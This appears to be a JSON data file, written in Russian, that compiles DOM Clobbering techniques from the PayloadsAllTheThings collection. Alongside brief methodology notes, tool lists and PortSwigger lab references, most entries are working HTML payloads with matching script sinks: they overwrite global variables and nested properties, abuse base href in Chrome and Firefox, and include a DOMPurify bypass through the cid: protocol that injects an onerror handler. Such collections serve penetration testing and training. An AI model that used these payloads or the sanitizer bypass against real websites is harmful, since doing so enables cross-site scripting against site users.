@@ -1,0 +1,112 @@
+{
+  "category": "DOM Clobbering",
+  "source": "PayloadsAllTheThings/DOM Clobbering/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Что такое DOM Clobbering",
+      "language": "text",
+      "tags": ["methodology", "dom-clobbering"],
+      "body": "DOM Clobbering — техника, при которой глобальные переменные перезаписываются («clobbered») за счёт HTML-элементов с определёнными атрибутами id или name.\nБраузер автоматически создаёт ссылки на именованные элементы в window и document, и эти ссылки перекрывают ожидаемые скриптом значения.\nЭто ломает логику скриптов и может приводить к уязвимостям, когда скрипт читает «переменную», на самом деле подменённую нашим HTML."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Где применимо — нужна HTML-инъекция без скриптов",
+      "language": "text",
+      "tags": ["methodology", "recon"],
+      "body": "Для эксплуатации нужна любая HTML-инъекция на странице (а не полноценный JS).\nКлассический сценарий: фильтр/санитайзер режет <script> и обработчики событий, но пропускает «безобидные» теги (a, form, input, iframe, base, img...).\nЦель — подсунуть элементы с нужными id/name так, чтобы скрипт страницы прочитал из них подконтрольное значение (sink вида x, x.y, x.y.value и т.д.)."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Тулзы и ресурсы",
+      "language": "text",
+      "tags": ["tools"],
+      "body": "SoheilKhodayari/DOMClobbering (domclob.xyz) — большой список DOM Clobbering payload'ов для разных браузеров (desktop/mobile).\nyeswehack/Dom-Explorer — веб-инструмент для тестирования различных HTML-парсеров и санитайзеров; показывает, как браузер парсит HTML, и помогает находить mutation XSS."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Лабы для практики (PortSwigger)",
+      "language": "text",
+      "tags": ["labs", "practice"],
+      "body": "• Exploiting DOM clobbering to enable XSS\n• Clobbering DOM attributes to bypass HTML filters\n• DOM clobbering test case protected by CSP\nСсылки: portswigger.net/web-security/dom-based/dom-clobbering/"
+    },
+
+    {
+      "subcategory": "Затирание через id/name",
+      "title": "Затирание x.y.value (form + output)",
+      "language": "html",
+      "tags": ["clobbering", "id", "value"],
+      "body": "// Payload\n<form id=x><output id=y>I've been clobbered</output>\n\n// Sink\n<script>alert(x.y.value);</script>"
+    },
+    {
+      "subcategory": "Затирание через id/name",
+      "title": "Затирание x.y через id + name (DOM collection)",
+      "language": "html",
+      "tags": ["clobbering", "htmlcollection", "anchor"],
+      "body": "// Payload\n<a id=x><a id=x name=y href=\"Clobbered\">\n\n// Sink\n<script>alert(x.y)</script>"
+    },
+    {
+      "subcategory": "Затирание через id/name",
+      "title": "Затирание document.getElementById() через <html>/<body>",
+      "language": "html",
+      "tags": ["clobbering", "getelementbyid", "id"],
+      "body": "// Payloads\n<html id=\"cdnDomain\">clobbered</html>\n<svg><body id=cdnDomain>clobbered</body></svg>\n\n\n// Sink \n<script>\nalert(document.getElementById('cdnDomain').innerText);//clobbbered\n</script>"
+    },
+
+    {
+      "subcategory": "Вложенные свойства",
+      "title": "Затирание x.y.z — 3 уровня вложенности",
+      "language": "html",
+      "tags": ["clobbering", "nested", "form"],
+      "body": "// Payload\n<form id=x name=y><input id=z></form>\n<form id=x></form>\n\n// Sink\n<script>alert(x.y.z)</script>"
+    },
+    {
+      "subcategory": "Вложенные свойства",
+      "title": "Затирание a.b.c.d — больше 3 уровней (вложенные iframe srcdoc)",
+      "language": "html",
+      "tags": ["clobbering", "nested", "iframe", "srcdoc"],
+      "body": "// Payload\n<iframe name=a srcdoc=\"\n<iframe srcdoc='<a id=c name=d href=cid:Clobbered>test</a><a id=c>' name=b>\"></iframe>\n<style>@import '//portswigger.net';</style>\n\n// Sink\n<script>alert(a.b.c.d)</script>"
+    },
+    {
+      "subcategory": "Вложенные свойства",
+      "title": "Затирание x.username и x.password (URL-парсинг href)",
+      "language": "html",
+      "tags": ["clobbering", "anchor", "username"],
+      "body": "// Payload\n<a id=x href=\"ftp:Clobbered-username:Clobbered-Password@a\">\n\n// Sink\n<script>\nalert(x.username)//Clobbered-username\nalert(x.password)//Clobbered-password\n</script>"
+    },
+
+    {
+      "subcategory": "HTMLCollection трюки",
+      "title": "Затирание forEach (Chrome only)",
+      "language": "html",
+      "tags": ["clobbering", "htmlcollection", "foreach", "chrome"],
+      "body": "// Payload\n<form id=x>\n<input id=y name=z>\n<input id=y>\n</form>\n\n// Sink\n<script>x.y.forEach(element=>alert(element))</script>"
+    },
+
+    {
+      "subcategory": "Эскалация до XSS",
+      "title": "Затирание значения через href (Firefox only)",
+      "language": "html",
+      "tags": ["clobbering", "href", "firefox", "xss"],
+      "body": "// Payload\n<base href=a:abc><a id=x href=\"Firefox<>\">\n\n// Sink\n<script>\nalert(x)//Firefox<>\n</script>"
+    },
+    {
+      "subcategory": "Эскалация до XSS",
+      "title": "Затирание x.xyz через base href (Chrome only)",
+      "language": "html",
+      "tags": ["clobbering", "base", "href", "chrome"],
+      "body": "// Payload\n<base href=\"a://Clobbered<>\"><a id=x name=x><a id=x name=xyz href=123>\n\n// Sink\n<script>\nalert(x.xyz)//a://Clobbered<>\n</script>"
+    },
+
+    {
+      "subcategory": "Обход санитайзеров (DOMPurify)",
+      "title": "Обход DOMPurify через протокол cid: (двойная кавычка не кодируется)",
+      "language": "html",
+      "tags": ["bypass", "dompurify", "cid", "xss"],
+      "body": "<a id=defaultAvatar><a id=defaultAvatar name=avatar href=\"cid:&quot;onerror=alert(1)//\">",
+      "meta": {
+        "tip": "DOMPurify разрешает протокол cid:, который не кодирует двойную кавычку (\"). Это позволяет вырваться из атрибута href и протащить onerror=alert(1) при последующей вставке значения в разметку."
+      }
+    }
+  ]
+}
